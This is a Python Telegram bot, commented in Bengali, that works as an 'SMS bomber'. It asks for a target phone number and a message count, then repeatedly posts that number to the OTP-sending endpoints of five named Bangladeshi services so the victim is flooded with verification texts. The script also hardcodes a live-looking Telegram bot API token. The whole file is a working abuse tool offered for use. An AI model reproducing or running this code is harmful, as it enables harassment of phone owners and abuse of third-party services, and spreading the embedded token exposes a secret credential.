import telebot
import requests
import time
from telebot import types
from threading import Thread
from flask import Flask

# --- সেটিংস ---
API_TOKEN = '8475845199:AAHX1diGmHBepMcYc8NSWQeXNVn_r2jBhjI' # আপনার টোকেনটি এখানে দিন
bot = telebot.TeleBot(API_TOKEN)
user_data = {}

# --- Render-এর জন্য Keep Alive সার্ভার ---
app = Flask('')
@app.route('/')
def home(): return "Bomber Bot is Online!"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- বোম্বার লজিক ও এপিআই ---
def bombing_logic(chat_id, target, amount):
    apis = [
        {"url": "https://api.chorki.com/v1/auth/otp/send", "data": {"phone": target, "type": "phone"}},
        {"url": "https://www.apex4u.com/api/v1/send-otp", "data": {"phone": target}},
        {"url": "https://api.shajgoj.com/v1/auth/otp/send", "data": {"phone": target}},
        {"url": "https://redx.com.bd/api/v1/user/otp", "data": {"phone": target}},
        {"url": "https://os.bproperty.com/v1/user/otp", "data": {"phone": target}}
    ]
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    sent = 0
    while sent < amount:
        for api in apis:
            if sent >= amount: break
            try:
                requests.post(api["url"], json=api["data"], headers=headers, timeout=5)
                sent += 1
            except: pass
            time.sleep(0.5)
    bot.send_message(chat_id, f"✅ সফলভাবে {target} নম্বরে {sent}টি এসএমএস পাঠানো শেষ!")

# --- কমান্ড হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def welcome(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 Start Bomb")
    bot.send_message(message.chat.id, "👋 স্বাগতম! বোম্বিং শুরু করতে বাটনে ক্লিক করুন।", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🚀 Start Bomb")
def ask_number(message):
    msg = bot.send_message(message.chat.id, "📱 টার্গেট নম্বর দিন (১১ ডিজিট):")
    bot.register_next_step_handler(msg, validate_number)

def validate_number(message):
    number = message.text
    if len(number) == 11 and number.isdigit():
        user_data[message.chat.id] = {'number': number}
        msg = bot.send_message(message.chat.id, "🔢 কতটি এসএমএস? (১-৫০):")
        bot.register_next_step_handler(msg, process_bomb)
    else:
        bot.send_message(message.chat.id, "❌ ভুল নম্বর! আবার চেষ্টা করুন।")

def process_bomb(message):
    if message.text.isdigit():
        amt = int(message.text)
        target = user_data[message.chat.id]['number']
        bot.send_message(message.chat.id, f"🔥 {target} নম্বরে বোম্বিং শুরু...")
        Thread(target=bombing_logic, args=(message.chat.id, target, amt)).start()

if __name__ == "__main__":
    keep_alive() # সার্ভার স্টার্ট
    bot.infinity_polling()
